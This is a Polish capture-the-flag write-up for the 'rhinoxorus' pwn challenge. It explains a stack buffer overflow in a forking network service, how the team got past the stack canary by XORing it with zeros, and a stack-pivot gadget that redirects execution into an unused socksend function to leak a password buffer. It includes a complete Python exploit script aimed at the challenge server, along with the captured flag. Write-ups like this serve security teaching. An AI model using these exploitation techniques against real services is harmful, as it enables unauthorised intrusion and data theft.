## rhinoxorus (pwn, 500p, ? solves)

Dostajemy program i analizujemy go. Po uruchomieniu wczytuje on zawartość pliku password.txt do zmiennej globalnej, i zaczyna nasłuchiwać na porcie 24242 i forkuje się dla każdego połączenia.

Każdy fork wczytuje 256 bajtów od usera i wywołuje jakąś funkcję z globalnej tablicy funkcji:

```
bytes_read = recv(sockfd, recv_buf, (unsigned int)BUF_SIZE, 0);
if (bytes_read > 0)
    func_array[recv_buf[0]](recv_buf, (unsigned int)bytes_read);
```

Każda z funkcji jest podobna, i wygląda mniej więcej tak:

```
unsigned char func_32(unsigned char *buf, unsigned int count)
{
    unsigned int i;
    unsigned char localbuf[0x84]; // stała 0x84 jest różna dla każdej funkcji w tablicy
    unsigned char byte=0x84; // stała 0x84 jest różna dla każdej funkcji w tablicy

    memset(localbuf, byte, sizeof(localbuf));
    printf("in function func_32, count is %u, bufsize is 0x84\n", count);

    if (0 == --count)
         return 0;

    for (i = 0; i < count; ++i)
         localbuf[i] ^= buf[i];

    func_array[localbuf[0]](localbuf+1, count);
    return 0;
}
```

Od razu widać że łatwo wywołać przepełnienie bufora, ale niestety - stos jest chroniony kanarkami więc nie będzie tak łatwo.

W kodzie widać też nieużywaną nigdzie funkcję socksend która wysyła podany w argumencie bufor do podanego w argumencie socketa.

Po chwili zastanowienia dochodzimy do wniosku że możemy pominąć kanarka po prostu xorując go z zerami. Następnie jedyne co musimy zrobić, to nadpisać adres powrotu w odpowiedni sposób, tak żeby wywołać funkcję socksend z parametrami socksend(fd, password, BUF_SIZE) (w ten sposób program sam wyśle do nas flagę).

Niestety nie jest tak prosto, na stosie nie ma wystarczająco wiele miejsca żeby zmieścic argumenty dla funkcji socksend (po nadpisaniu zmiennej 'counter' kończy się wykonanie funkcji). Ale jeśli postaramy się, możemy przeskoczyć do ramki funkcji niżej. Używamy do tego następującego gadgetu:

```
gadget_pop:
add     esp, 0Ch    ; pominięcie 3 elementów na stosie
pop     ebx         ; zdjęcie elementu ze stosu (i zapisanie do ebx)
pop     esi         ; zdjęcie elementu ze stosu (i zapisanie do esi)
pop     edi         ; zdjęcie elementu ze stosu (i zapisanie do edi)
pop     ebp         ; zdjęcie elementu ze stosu (i zapisanie do ebp)
retn                ; zdjęcie elementu ze stosu i skoczenie od niego
```

Który zdejmuje 7 elementów ze stosu, i skacze pod 8.

Więc ostateczny plan jest taki: skaczemy pod ten gadget, on zdejmuje odpowiednią ilość parametrów ze stosu, wtedy wykonanie trafia na początek naszego czystego, niexorowanego bufora w pamięci i możmy zrobić co tylko chcemy.

Docelowo stos będzie wyglądał tak:

![](./shellcode.png)

Skrypt którego użyliśmy :o wygenerowania shellcodu i wysłania go do programu:

```
# -*- coding: utf-8 -*-
import struct, socket

HOST = '54.152.37.20'
PORT = 24242

s = socket.socket()
s.connect((HOST, PORT))

# oryginalny adres powrotu na stosie
first_return_addr = 0x08056AFA
# placeholder na zmienne których zawartość jest nieważna
placeholder = 'xxxx'

gadget_pop_xor = struct.pack('<I', 0x080578f5 ^ first_return_addr)
password_addr = struct.pack('<I', 0x0805F0C0)
socksend_addr = struct.pack('<I', 0x0804884B)
exit_addr = struct.pack('<I', 0x08048670)

def get_payload(counter):
    # xorujemy z 1, bo chcemy żeby counter przyjął 1
    counter_xor = struct.pack('<I', counter ^ 1)
    # składamy payload
    return (
            # adres funkcji socksend (znany)
            socksend_addr
            # adres powrotu z funkcji socksend do exit
            + exit_addr
            # deskryptor dla socksend (przewidywana wartość)
            + struct.pack('<I', 4)
            # adres zmiennej globalnej password dla socksend
            + password_addr
            # ilość bajtów do przeczytania dla socksend
            + struct.pack('<I', 256)
            # wolne miejsce na stosie (niezajęta część bufora)
            + placeholder * 39
            # xorowane z kanarkiem
            + '\0\0\0\0'
            # puste miejsce na stosie
            + placeholder * 3
            # podmieniamy adres powrotu na gadget_pop
            + gadget_pop_xor
            # xorowane z niepotrzebnym już argumentem z adresem bufora
            + placeholder
            # zerowanie countera
            + counter_xor
            )

# zmierzenie długości payloadu
payload_length = len(get_payload(123))
# i stworzenie ostatecznego payloadu
payload = get_payload(payload_length - 1)
s.send(payload)
print s.recv(99999)
```

I udaje się - skrypt który napisaliśmy zadziałał. Zdobyliśmy w ten sposób upragnioną flagę:
    cc21fe41b44ba70d0e6978c840698601
